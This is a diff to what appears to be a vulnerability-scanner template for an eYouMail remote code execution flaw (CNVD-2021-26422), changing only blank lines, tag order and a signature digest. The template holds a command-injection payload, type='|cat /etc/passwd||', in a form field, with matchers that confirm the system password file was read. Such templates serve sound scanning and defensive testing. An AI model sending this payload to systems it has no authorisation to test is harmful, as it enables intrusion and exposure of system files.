@@ -1,5 +1,4 @@
 id: CNVD-2021-26422
-
 info:
   name: eYouMail - Remote Code Execution
   author: daffainfo
@@ -14,8 +13,7 @@ info:
     cwe-id: CWE-77
   metadata:
     max-request: 1
-  tags: cnvd2021,cnvd,eyoumail,rce,vuln
-
+  tags: cnvd,cnvd2021,eyoumail,rce,vuln
 http:
   - raw:
       - |
@@ -24,14 +22,12 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         type='|cat /etc/passwd||'
-
     matchers-condition: and
     matchers:
       - type: regex
         regex:
           - "root:.*:0:0:"
-
       - type: status
         status:
           - 200
-
+        # digest: 4a0a00473045022100905490c927869af4b7cf56c5f6ebe64fc8d641c1097257e827dae90a87aaf3f002203f406db473a5e8f7117d1b5b118d8d11e31de43d58266ec02b223e6ffe99a798:922c64590222798bb761d5b6d8e72950
